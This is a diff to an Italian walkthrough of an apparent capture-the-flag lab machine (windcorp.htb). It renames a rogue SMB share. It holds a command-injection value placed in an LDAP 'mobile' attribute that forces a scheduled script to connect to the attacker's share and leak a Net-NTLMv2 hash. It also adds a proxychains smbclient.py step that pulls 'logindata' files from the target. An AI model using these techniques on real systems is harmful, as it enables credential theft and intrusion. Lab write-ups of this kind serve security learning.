@@ -453,13 +453,13 @@ sudo ssh -i ~/keys/ed25519_gen root@10.10.11.179 \
 Avviamo smbserver.py (impacket v0.10):
 
 ```bash
-smbserver.py df . -smb2support
+smbserver.py hackita . -smb2support
 ```
 
 Impostiamo il mobile attribute:
 
 ```bash
-mobile: $(net use \\\\webserver.windcorp.htb\\df 2>&1)
+mobile: $(net use \\\\webserver.windcorp.htb\\hackita 2>&1)
 ```
 
 Quando lo script viene eseguito, catturiamo il Net-NTLMv2 di scriptrunner:
@@ -573,6 +573,15 @@ Dal Kali:
 proxychains smbclient -k //hope.windcorp.htb/WC-Share
 smb: \temp\> get state
 smb: \temp\> get logindata
+```
+
+Oppure via smbclient.py (impacket v0.10):
+
+```bash
+proxychains smbclient.py -k -no-pass windcorp.htb/ray.duncan@hope.windcorp.htb
+# use WC-Share
+# get temp\state
+# get temp\logindata
 ```
 
 Più comodo, zero encoding intermedi, file binari intatti.
